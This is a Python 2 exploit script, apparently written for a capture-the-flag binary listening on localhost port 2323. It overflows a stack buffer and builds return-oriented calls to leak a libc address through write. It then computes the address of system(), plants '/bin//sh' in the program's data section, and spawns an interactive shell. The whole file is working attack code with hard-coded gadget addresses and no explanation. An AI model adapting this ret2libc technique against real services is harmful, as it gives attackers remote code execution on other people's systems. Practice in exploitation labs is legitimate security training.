import sys
sys.path.append("/home/blankwall/Template")

from isis import *
pattern = file("/home/blankwall/Template/pattern").read()
debug = True
host = "localhost"
port = 2323

def connect():
	s = get_socket((host,port))
	s.settimeout(0x10000000)
	return s

s = connect()
if debug:
	raw_input("?")

#READ INTO BSS
def read_():
	read_plt = 0x080483e0
	ret = 0x0804867f#0x0804a02c#0x0804879c
	buf = 0x0804a044
	size = 0x400
	fd = 0x0
	return lei(read_plt,ret,fd,buf,size)

def leak_libc():
	write_ = 0x08048450
	ret = 0x0804867f
	buf = 0x0804a028
	size = 0x4
	fd = 0x1
	return lei(write_,ret,fd,buf,size)

#LEAK OUT LIBC
s.send("\x00" * 0x60 + "B" * 12 + leak_libc())

#READ IN /BIN/SH
s.send("\x00" * 0x60 + "B" * 4 + read_())

write = 0
for i in ulei(s.recv(0x500)):
	write = i
system = write-0x9b430
print "SYSTEM {0}".format(hex(write-0x9b430))

#SEND IN SOME STUFF AND TRIGGER VULN
raw_input("@")
s.send(lei(system) + lei(0xdeadbeef) + lei(0x0804a050) + "/bin//sh"+ lei(0x0))
raw_input("!")
s.send("\x00" * 0x60 + "BBBBPPPP" + lei(0xdeadbeef) + lei(system) + "AAAA" + lei(0x0804a050))

telnet_shell(s)